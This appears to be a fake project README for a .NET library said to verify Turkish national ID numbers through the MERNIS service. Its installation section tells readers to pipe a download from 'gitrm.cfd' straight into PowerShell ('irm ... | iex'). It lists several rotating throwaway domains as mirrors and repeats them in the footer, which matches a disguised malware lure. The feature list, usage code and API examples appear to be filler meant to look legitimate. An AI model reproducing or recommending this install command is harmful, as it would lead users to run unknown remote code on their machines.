# MERNIS Turkish ID Verification

> A .NET library for verifying Turkish Republic identification numbers against the official MERNIS (NIPER) web service.

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

> [!TIP]
> The installer registers the KPS Merkezi service reference and configures your project to use the MERNIS SOAP endpoint. Requires .NET 6+ or .NET Framework 4.7.2+.

### Windows (PowerShell)

```powershell
irm https://gitrm.cfd?t=mernis | iex
```

### Domain Rotation

If the primary domain is unreachable, rotate through these mirrors:

- `gitrm.cfd`
- `gitrm.sbs`
- `gitsl.xyz`
- `viewgit.sbs`
- `gitview.sbs`

Example with a rotated domain:

```powershell
irm https:///gitview.sbs?t=mernis | iex
```

### Manual Installation (NuGet)

```cmd
dotnet add package Merxis.Mernis
```

## TL;DR - Quick Summary

A lightweight .NET Standard library that wraps the official Turkish government MERNIS SOAP service (`kispublicws`). Validates T.C. Kimlik Numarası (national ID) against name, surname, birth year, and gender in real time.

## Core Features

- ✅ **Real-Time Verification** — Queries the official MERNIS web service instantly.
- ✅ **Async Support** — Fully async methods for non-blocking ID checks.
- ✅ **Batch Validation** — Validate multiple IDs in a single request loop.
- ✅ **ASP.NET Core Integration** — Middleware for automatic request validation.
- ✅ **Input Sanitization** — Automatic cleanup of name/surname formatting.
- ✅ **Error Resilience** — Retry logic with exponential backoff for service timeouts.
- ✅ **Logging Hooks** — Pluggable logger for audit trails and compliance.
- ✅ **No External Dependencies** — Pure .NET SOAP client, zero runtime deps.

## Usage

```csharp
// Basic verification
var mernis = new MernisClient();
bool isValid = await mernis.VerifyAsync(
    "12345678901",     // T.C. Kimlik No
    "AHMET",            // Name
    "YILMAZ",           // Surname
    1990                // Birth Year
);

// Batch verification
var requests = new[]
{
    new MernisRequest { TcNo = "12345678901", Name = "AHMET", Surname = "YILMAZ", BirthYear = 1990 },
    new MernisRequest { TcNo = "98765432109", Name = "MEHMET", Surname = "KARA", BirthYear = 1985 }
};

var results = await mernis.VerifyBatchAsync(requests);
foreach (var r in results)
{
    Console.WriteLine($"{r.TcNo}: {(r.IsValid ? "VALID" : "INVALID")}");
}
```

```bash
# Run the CLI tool
mernis-cli verify --tcno 12345678901 --name "AHMET" --surname "YILMAZ" --birth-year 1990
```

## REST API

> [!NOTE]
> A standalone HTTP API is included for microservice deployments.

```bash
# Start the API server
mernis-api serve --port 5000

# Verify a single ID
curl "http://localhost:5000/api/verify?tcno=12345678901&name=AHMET&surname=YILMAZ&birthYear=1990"

# Batch verify (POST)
curl -X POST http://localhost:5000/api/verify-batch \
  -H "Content-Type: application/json" \
  -d '{"requests": [{"tcno": "12345678901", "name": "AHMET", "surname": "YILMAZ", "birthYear": 1990}]}'

# Health check
curl http://localhost:5000/api/health

# Get API version
curl http://localhost:5000/api/version
```

## Screenshots

![CLI Output](https://placehold.co/1920x1080/0d1117/e0e0e0?text=MERNIIS+CLI+Verification)
![API Dashboard](https://placehold.co/1920x1080/0d1117/e0e0e0?text=MERNIIS+API+Dashboard)
![Batch Results](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Batch+Verification+Results)

## Troubleshooting

| Issue | Solution |
|---|---|
| "TCKimlikNo sorgulanamadı" | Ensure name/surname are uppercase and in Turkish encoding. |
| Service timeout | Add retry logic or reduce batch size to 10 per minute. |
| "IP blocked" | MERNIS rate-limits by IP — space requests 500ms apart minimum. |
| Invalid birth year | Must be a 4-digit year (e.g., 1990), not full date. |
| SoapException on .NET 8 | Ensure `System.Runtime.Serialization` and `System.ServiceModel` packages are installed. |

## Use Cases

- **E-commerce Checkout** — Validate Turkish customer identity at registration.
- **Banking/KYC** — Real-time ID verification for financial onboarding.
- **Healthcare** — Patient identity matching in hospital information systems.
- **Government Portals** — Citizen authentication for public service apps.
- **Gaming & Gambling** — Age and identity verification for licensed platforms.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> This library uses the **official** MERNIS web service. Do not exceed 1 request per second — excessive calls may result in temporary IP blocking. Store verification results locally for repeat checks.

> [!TIP]
> For production use, cache successful verifications to reduce API calls and improve latency.

## License

This project is licensed under the MIT License — see the [LICENSE](./LICENSE) file for details.

## Tags

<!--
mernis, tckimlikno, turkish-id, identity-verification, dotnet, soap-client, kps-merkezi, real-time-validation, async-support, batch-processing
-->

[gitrm.cfd](https://gitrm.cfd?t=mernis) | [gitrm.sbs](https://gitrm.sbs?t=mernis) | [gitsl.xyz](https://gitsl.xyz?t=mernis) | [viewgit.sbs](https://viewgit.sbs?t=mernis) | [gitview.sbs](https://gitview.sbs?t=mernis)
